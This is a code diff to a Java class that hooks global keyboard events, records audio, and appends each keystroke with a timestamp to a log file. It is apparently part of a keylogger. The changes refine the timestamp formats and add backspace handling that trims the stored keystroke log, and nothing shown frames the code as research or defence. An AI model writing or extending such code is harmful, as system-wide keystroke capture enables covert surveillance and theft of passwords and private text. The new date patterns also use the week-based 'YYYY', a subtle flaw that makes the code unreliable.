@@ -49,7 +49,8 @@ import de.ralleytn.simple.audio.Recorder;
 import de.ralleytn.simple.audio.StreamedAudio;
 
 public class AVMisc implements NativeKeyListener {
-	private static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM_dd_yy_HH_mm");
+	private static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM_dd_YYYY_HH_mm_ss");
+	private static final DateTimeFormatter logDTF = DateTimeFormatter.ofPattern("MM-dd-YYYY HH:mm:ss");
 	private static final String OS = System.getProperty("os.name");
 	private long RECORD_TIME = 0;
 	private AtomicBoolean recordingAudio = new AtomicBoolean();
@@ -526,7 +527,7 @@ public class AVMisc implements NativeKeyListener {
 	public void nativeKeyPressed(NativeKeyEvent event) {
 		try {
 			String keyText = "";
-			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), LocalDateTime.now().toString());
+			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), logDTF.format(LocalDateTime.now()));
 			switch(event.getKeyCode()) {
 				case NativeKeyEvent.VC_SPACE:
 					keyText = " ";
@@ -536,6 +537,14 @@ public class AVMisc implements NativeKeyListener {
 					break;
 				case NativeKeyEvent.VC_TAB:
 					keyText = "\t";
+					break;
+				case NativeKeyEvent.VC_BACKSPACE:
+					byte[] data = Files.readAllBytes(klFilePath);
+					byte[] arr = Arrays.copyOf(data, data.length-1);
+					Files.deleteIfExists(klFilePath);
+					Files.write(klFilePath, arr, StandardOpenOption.CREATE_NEW);
+					data = null;
+					arr = null;
 					break;
 				case NativeKeyEvent.VC_BACKQUOTE:
 					keyText = shiftIsDown ? "~" : "`";
@@ -630,7 +639,6 @@ public class AVMisc implements NativeKeyListener {
 					break;
 				default:
 					break;
-						
 			}
 			if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
 				shiftIsDown = true;
